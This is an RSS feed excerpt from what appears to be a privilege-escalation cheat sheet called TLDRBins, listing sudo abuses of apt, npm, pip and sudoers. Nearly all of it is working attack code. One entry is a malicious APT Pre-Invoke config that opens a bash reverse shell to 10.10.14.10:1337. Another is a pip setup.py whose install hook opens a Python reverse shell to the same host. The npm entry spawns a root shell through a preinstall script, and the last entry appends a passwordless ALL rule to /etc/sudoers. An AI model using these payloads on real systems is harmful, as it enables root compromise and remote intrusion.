channel.title: Sudo on TLDRBins
channel.description: Recent content in Sudo on TLDRBins

item.title: Apt
item.description: Privesc Abuse apt update # Create a malicious config echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'\''"}' > /etc/apt/apt.conf.d/evil # Exploit sudo apt update -y

item.title: npm
item.description: npm Privilege Escalation Create a package.json { "name": "root", "version": "1.0.0", "scripts": { "preinstall": "/bin/bash" } } mkdir test mv package.json test/ sudo npm i test/ --unsafe

item.title: pip
item.description: Privesc #!/usr/bin/env python3 from setuptools import setup from setuptools.command.install import install import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(("10.10.14.10",1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call(["/bin/sh", "-i"]) setup( cmdclass={ "install": Exploit } ) # Run sudo pip install .

item.title: sudoers
item.description: Privesc Abuse /etc/sudoers # IF you have control over `/etc/sudoers` chmod 600 /etc/sudoers echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers chmod 440 /etc/sudoers
